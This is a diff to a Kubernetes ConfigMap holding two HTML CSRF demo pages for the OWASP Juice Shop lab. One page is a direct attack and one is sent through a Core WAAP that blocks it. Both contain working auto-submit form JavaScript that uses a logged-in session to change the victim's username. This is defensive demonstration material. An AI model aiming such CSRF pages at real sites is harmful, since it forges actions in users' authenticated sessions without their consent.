@@ -51,11 +51,11 @@ metadata:
   name: index-page
   namespace: attacker
 data:
-  index.html: |
+  direct.html: |
     <!DOCTYPE html>
     <html>
     <head><title>CSRF Attack</title></head>
-    
+
     <script language="JavaScript">
         function submitForm() {
             let attackForm = document.forms["hackingform"];
@@ -72,44 +72,43 @@ data:
             attackForm.submit();
         }
     </script>
-    
+
     <body style="background-color:#FF8484; font-family: Roboto, Helvetica Neue, sans-serif;">
     <table style="margin-bottom:20px;"><tbody><tr><td>
     <img src="data:image/png;base64,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" />
     </td><td>
-    <h2>Juiceshop Username Hacking Form</h2>
+    <h2>Juiceshop Username Hacking Form (direct access)</h2>
     </td></tr></tbody></table>
-    
-    This HTML page, loaded from a different website than Juiceshop, will send a request to the Juiceshop. Because     
+
+    This HTML page, loaded from a different website than Juiceshop, will send a request to the Juiceshop. Because
     the page was not received from the Juiceshop URL, the browser will send an invalid "Origin" header with the
     request; the CSRF protection is based on validating this header. The Juiceshop will still accept the request
     because it does not validate where the request is coming from.
     <p></p>
-    The request attempts to change the "Username" in the profile page to "hacked". 
+    The request attempts to change the "Username" in the profile page to "hacked".
     <p></p>
 
     <div style="padding:10px; background-color:#FCFCAC; margin-top:20px; margin-bottom:20px;">
     <b>NOTE: </b> This attack requires that you are currently logged in at the Juiceshop in this webbrowser.
     Your existing session (in another tab or window) will be abused to send this "evil" request to Juiceshop.
     </div>
-    
+
     <div style="background-color:#FFCFCF; padding:10px;">
       <h3>Juiceshop Username Hacking Form</h3>
         <ul>
-            <li>Copy the URL of the Juiceshop tab</li>
-            <li>Paste the Juiceshop URL in the "URL" form field below</li>
+            <li>Verify Juiceshop URL in the "URL" form field below</li>
             <li>Then click the "Hack Username" button</li>
         </ul>
       <p>
         After these steps, the username attribute in Juiceshop will have changed to the value below.
-      <form id="hackingform" 
-            action="empty" 
+      <form id="hackingform"
+            action="empty"
             method="POST">
             <table><tbody>
             <tr><td align="right">
                 <b>Juiceshop URL:</b>
                 </td><td>
-                <input id="juiceshopUrl" name="url" type="text" value="" size=60/>
+                <input id="juiceshopUrl" name="url" type="text" value="${JUICESHOP_DIRECT}" size=60/>
             </td></tr>
             <tr><td align="right">
                 <b>Username:</b>
@@ -124,8 +123,85 @@ data:
     </div>
 
     <div style="padding:10px; background-color:#FCFCAC; margin-top:20px;">
-    <b>NOTE: </b>After submitting the form, you will either see the Juiceshop page here, which indicates that the
-    attack was successful; or you will see an error message "Invalid origin", indicating the request was blocked
+    <b>NOTE: </b>After submitting the form, you will be redirected to the Juiceshop profile page, which indicates that the
+    attack was successful.
+    </div>
+
+    </body></html>
+  waap.html: |
+    <!DOCTYPE html>
+    <html>
+    <head><title>CSRF Attack</title></head>
+
+    <script language="JavaScript">
+        function submitForm() {
+            let attackForm = document.forms["hackingform"];
+            let urlField = attackForm.elements["juiceshopUrl"]
+            let url = urlField.value;
+            if (url.includes("://")) {
+                url = url.substring(url.indexOf("://") + 3);
+            }
+            if (url.includes("/")) {
+                url = url.substring(0, url.indexOf("/"));
+            }
+            url = "https://" + url + "/profile";
+            attackForm.action=url;
+            attackForm.submit();
+        }
+    </script>
+
+    <body style="background-color:#FF8484; font-family: Roboto, Helvetica Neue, sans-serif;">
+    <table style="margin-bottom:20px;"><tbody><tr><td>
+    <img src="data:image/png;base64,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" />
+    </td><td>
+    <h2>Juiceshop Username Hacking Form (via Core WAAP)</h2>
+    </td></tr></tbody></table>
+
+    This HTML page, loaded from a different website than Juiceshop, will send a request to the Juiceshop. Because
+    the page was not received from the Juiceshop URL, the browser will send an invalid "Origin" header with the
+    request; the CSRF protection is based on validating this header. The Juiceshop will still accept the request
+    because it does not validate where the request is coming from. This time however Juiceshop is accessed via
+    USP Core WAAP which prevents the attack.
+    <p></p>
+    The request attempts to change the "Username" in the profile page to "hackedAgain".
+    <p></p>
+
+    <div style="padding:10px; background-color:#FCFCAC; margin-top:20px; margin-bottom:20px;">
+    <b>NOTE: </b> This attack requires that you are currently logged in at the Juiceshop in this webbrowser.
+    Your existing session (in another tab or window) will be abused to send this "evil" request to Juiceshop.
+    </div>
+
+    <div style="background-color:#FFCFCF; padding:10px;">
+      <h3>Juiceshop Username Hacking Form</h3>
+        <ul>
+            <li>Verify the Juiceshop URL in the "URL" form field below</li>
+            <li>Then click the "Hack Username" button</li>
+        </ul>
+      <p>
+        After these steps, the username attribute in Juiceshop will have changed to the value below.
+      <form id="hackingform"
+            action="empty"
+            method="POST">
+            <table><tbody>
+            <tr><td align="right">
+                <b>Juiceshop URL:</b>
+                </td><td>
+                <input id="juiceshopUrl" name="url" type="text" value="${JUICESHOP_WAAP}" size=60/>
+            </td></tr>
+            <tr><td align="right">
+                <b>Username:</b>
+                </td><td>
+                <input name="username" type="text" value="hackedAgain" />
+            </td></tr>
+            <tr><td></td><td>
+               <input type="button" value="Hack Username" onClick="submitForm()" />
+            </td></tr>
+           </tbody></table>
+      </form>
+    </div>
+
+    <div style="padding:10px; background-color:#FCFCAC; margin-top:20px;">
+    <b>NOTE: </b>After submitting the form, you will see an error message "Invalid origin", indicating the request was blocked
     by the Core-WAAP service.
     </div>
 
